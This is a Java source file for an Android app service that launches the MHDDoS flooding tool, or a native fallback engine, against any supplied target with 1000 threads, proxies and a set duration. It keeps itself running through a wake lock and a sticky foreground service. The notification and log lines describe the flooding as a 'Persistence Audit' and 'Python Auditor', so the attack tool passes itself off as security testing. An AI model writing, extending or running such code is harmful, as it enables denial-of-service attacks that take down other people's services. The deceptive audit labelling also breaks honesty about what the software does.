package com.mzkyzak.ddospro;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.io.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

/**
 * MHDDoSBridgeService - SentinelFlow Persistence Bridge v6.5
 * Auto-deployment with multiple Python path attempts and robust Native fallback.
 */
public class MHDDoSBridgeService extends Service {
    public static final AtomicLong packetCount = new AtomicLong(0);
    public static final AtomicLong packetPerSecond = new AtomicLong(0);
    
    private volatile boolean isRunning = false;
    private Process process;
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private PowerManager.WakeLock wakeLock;
    private NativeMHDDoS nativeEngine;
    private final Handler handler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (pm != null) {
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Sentinel:PersistenceBridge");
            wakeLock.acquire(10 * 60 * 60 * 1000L);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (isRunning || intent == null) return START_STICKY;

        final String target = intent.getStringExtra("target");
        String m = intent.getStringExtra("method");
        if (m == null) m = "BYPASS"; 
        final String method = m;
        final int threads = intent.getIntExtra("threads", 1000);
        final int duration = intent.getIntExtra("duration", 3600);

        isRunning = true;
        packetCount.set(0);
        packetPerSecond.set(0);
        showNotification(target, method);

        executor.execute(() -> {
            deployAssetsIfNeeded();
            
            boolean pythonStarted = false;
            try {
                String toolDir = getFilesDir().getAbsolutePath() + "/MHDDoS";
                File startPy = new File(toolDir, "start.py");
                
                if (startPy.exists()) {
                    String[] pythonPaths = {"python3", "python", "/data/data/com.termux/files/usr/bin/python3", "/data/data/com.mzkyzak.ddospro/files/python/bin/python3"};
                    for (String path : pythonPaths) {
                        try {
                            Log.i("SentinelBridge", "Attempting Python Path: " + path);
                            ProcessBuilder pb = new ProcessBuilder(
                                path, "start.py", method, target, "0", 
                                String.valueOf(threads), "proxies.txt", "100", String.valueOf(duration)
                            );
                            pb.directory(new File(toolDir));
                            pb.redirectErrorStream(true);
                            process = pb.start();
                            pythonStarted = true;
                            Log.i("SentinelBridge", "Python Auditor Active using: " + path);
                            break;
                        } catch (IOException e) {
                            Log.w("SentinelBridge", "Path " + path + " failed.");
                        }
                    }
                    
                    if (pythonStarted) {
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        String line;
                        while (isRunning && (line = reader.readLine()) != null) {
                            if (line.contains("Attack Started") || line.contains("Target:")) packetCount.addAndGet(threads / 2);
                            Log.v("MHDDoS_STDOUT", line);
                        }
                        process.waitFor();
                    }
                }
            } catch (Exception e) {
                Log.e("SentinelBridge", "Python Bridge Critical Error: " + e.getMessage());
            }

            if (isRunning && (!pythonStarted || !isProcessRunning(process))) {
                Log.w("SentinelBridge", "Handoff: Triggering Native Persistence Engine v6.5...");
                nativeEngine = new NativeMHDDoS(threads);
                nativeEngine.start(target, method, threads, duration);
                
                while (isRunning) {
                    packetCount.set(nativeEngine.packetCount.get());
                    try { Thread.sleep(200); } catch (InterruptedException e) { break; }
                }
            }
        });

        handler.post(statsUpdate);
        return START_STICKY;
    }

    private boolean isProcessRunning(Process p) {
        if (p == null) return false;
        try { p.exitValue(); return false; } catch (IllegalThreadStateException e) { return true; }
    }

    private void deployAssetsIfNeeded() {
        File toolDir = new File(getFilesDir(), "MHDDoS");
        if (!toolDir.exists()) toolDir.mkdirs();
        copyAssetFolder("MHDDoS", toolDir.getAbsolutePath());
    }

    private void copyAssetFolder(String assetPath, String localPath) {
        try {
            String[] files = getAssets().list(assetPath);
            if (files == null) return;
            new File(localPath).mkdirs();
            for (String f : files) {
                String a = assetPath + "/" + f;
                String l = localPath + "/" + f;
                String[] subFiles = getAssets().list(a);
                if (subFiles != null && subFiles.length > 0) copyAssetFolder(a, l);
                else copyAsset(a, l);
            }
        } catch (IOException e) { Log.e("SentinelBridge", "Asset deployment failed."); }
    }

    private void copyAsset(String a, String l) {
        try (InputStream in = getAssets().open(a); OutputStream out = new FileOutputStream(l)) {
            byte[] buf = new byte[8192];
            int r;
            while ((r = in.read(buf)) != -1) out.write(buf, 0, r);
        } catch (IOException e) { Log.e("SentinelBridge", "File deployment failed: " + a); }
    }

    private final Runnable statsUpdate = new Runnable() {
        private long lastCount = 0;
        @Override
        public void run() {
            if (!isRunning) return;
            long current = packetCount.get();
            packetPerSecond.set(current - lastCount);
            lastCount = current;
            handler.postDelayed(this, 1000);
        }
    };

    private void showNotification(String t, String m) {
        String cid = "ultima_audit_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(cid, "SentinelFlow Persistence", NotificationManager.IMPORTANCE_LOW);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(c);
        }
        Notification n = new NotificationCompat.Builder(this, cid)
            .setContentTitle("🛡️ SentinelFlow: Persistence Audit")
            .setContentText("[" + m + "] -> " + t)
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setOngoing(true).build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) startForeground(25, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
        else startForeground(25, n);
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (process != null) process.destroy();
        if (nativeEngine != null) nativeEngine.stop();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        executor.shutdownNow();
        handler.removeCallbacks(statsUpdate);
        super.onDestroy();
    }
    @Override public IBinder onBind(Intent intent) { return null; }
}